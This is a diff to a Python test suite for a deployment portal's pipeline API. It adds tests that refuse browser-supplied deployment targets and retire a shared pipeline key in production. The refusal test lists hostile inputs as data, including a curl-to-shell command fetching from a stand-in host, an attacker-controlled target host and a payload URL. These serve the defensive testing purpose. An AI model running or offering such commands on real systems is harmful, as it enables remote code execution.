@@ -308,23 +308,41 @@ def test_module_pipeline_trigger_uses_the_delivery_application_contract():
     assert triggered.json()['applicationId'] == created.json()['applicationId']
 
 
+def test_a_browser_supplied_deployment_target_is_refused_not_quietly_overridden():
+    """These keys used to be accepted and then silently replaced.
+
+    Neutralising an override looks identical, to the caller, to the override having
+    worked -- the difference only shows up at the incident review. Refusing says so.
+    """
+
+    for forbidden in (
+        {'target_hosts': ['attacker-controlled-host']},
+        {'deployment_tasks': ['curl https://unreviewed.example/script | sh']},
+        {'task_settings': {'healthCheck': {'script': 'exit 0'}}},
+        {'kubeconfig_ref': 'someone-elses-cluster'},
+        {'artifact_url': 'https://unreviewed.example/payload.tar.gz'},
+    ):
+        refused = client.post('/modules/hello-container/pipeline-runs', json={
+            'commitSha': 'a1c4e2f', 'branch': 'main', 'environment': 'dev',
+            'parameters': forbidden,
+        })
+        assert refused.status_code == 422, forbidden
+        assert refused.json()['code'] == 'DEPLOYMENT_PARAMETER_NOT_ACCEPTED', forbidden
+
+
 def test_reference_module_is_provisioned_and_can_trigger_the_demo_pipeline():
     triggered = client.post('/modules/hello-container/pipeline-runs', json={
         'commitSha': 'a1c4e2f',
         'branch': 'main',
         'environment': 'dev',
-        'parameters': {
-            'portalPipeline': 'ci',
-            'target_hosts': ['attacker-controlled-host'],
-            'deployment_tasks': ['curl https://unreviewed.example/script | sh'],
-            'task_settings': {'healthCheck': {'script': 'exit 0'}},
-        },
+        'parameters': {'buildProfile': 'ci'},
     })
 
     assert triggered.status_code == 202
     assert triggered.json()['status'] == 'queued'
     assert triggered.json()['applicationId'] == client.get('/modules/hello-container').json()['applicationId']
-    assert triggered.json()['parameters']['portalPipeline'] == 'ci'
+    assert triggered.json()['parameters']['buildProfile'] == 'ci'
+    # The target still comes from the module's registered configuration, not the request.
     assert triggered.json()['parameters']['target_hosts'] == ['localhost']
     assert triggered.json()['parameters']['target_environment'] == 'dev'
     assert triggered.json()['parameters']['deployment_tasks'] == []
@@ -605,6 +623,46 @@ def test_pipeline_can_publish_ci_report_for_a_module_version(monkeypatch):
     assert version['ciReport']['commit'] == 'a1c4e2f'
 
 
+def test_the_shared_pipeline_key_is_not_accepted_in_production_at_all(monkeypatch):
+    """Workload identity replaces it; leaving it working would make the rollout cosmetic."""
+
+    monkeypatch.setenv('NETCI_PIPELINE_API_KEY', 'a-real-shared-key')
+    monkeypatch.setenv('NETCI_ENVIRONMENT', 'production')
+    monkeypatch.delenv('NETCI_ALLOW_LEGACY_PIPELINE_KEY', raising=False)
+
+    response = client.post(
+        '/modules/hello-container/versions/v1.0.0/ci-report',
+        headers={'Authorization': 'Bearer a-real-shared-key'},
+        json={'coverage': 87, 'autoTest': 'passed', 'sast': 'passed', 'sastIssues': 0,
+              'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 2}, 'commit': 'a1c4e2f'},
+    )
+
+    assert response.status_code == 401
+    assert response.json()['code'] == 'PIPELINE_UNAUTHORIZED'
+
+
+def test_the_shared_pipeline_key_still_works_during_a_declared_migration(monkeypatch):
+    """An operator gets a window to roll workloads over, but has to ask for it by name."""
+
+    client.post('/modules/hello-container/versions', json={
+        'tag': 'v1.0.0',
+        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
+        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
+    })
+    monkeypatch.setenv('NETCI_PIPELINE_API_KEY', 'a-real-shared-key')
+    monkeypatch.setenv('NETCI_ENVIRONMENT', 'production')
+    monkeypatch.setenv('NETCI_ALLOW_LEGACY_PIPELINE_KEY', 'true')
+
+    response = client.post(
+        '/modules/hello-container/versions/v1.0.0/ci-report',
+        headers={'Authorization': 'Bearer a-real-shared-key'},
+        json={'coverage': 87, 'autoTest': 'passed', 'sast': 'passed', 'sastIssues': 0,
+              'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 2}, 'commit': 'a1c4e2f'},
+    )
+
+    assert response.status_code == 202
+
+
 def test_pipeline_api_key_has_no_implicit_production_default(monkeypatch):
     client.post('/modules/hello-container/versions', json={
         'tag': 'v1.0.0',
@@ -613,6 +671,9 @@ def test_pipeline_api_key_has_no_implicit_production_default(monkeypatch):
     })
     monkeypatch.delenv('NETCI_PIPELINE_API_KEY', raising=False)
     monkeypatch.setenv('NETCI_ENVIRONMENT', 'production')
+    # Even inside the migration window there is no built-in key: the local default must
+    # never become a production credential by omission.
+    monkeypatch.setenv('NETCI_ALLOW_LEGACY_PIPELINE_KEY', 'true')
 
     response = client.post(
         '/modules/hello-container/versions/v1.0.0/ci-report',
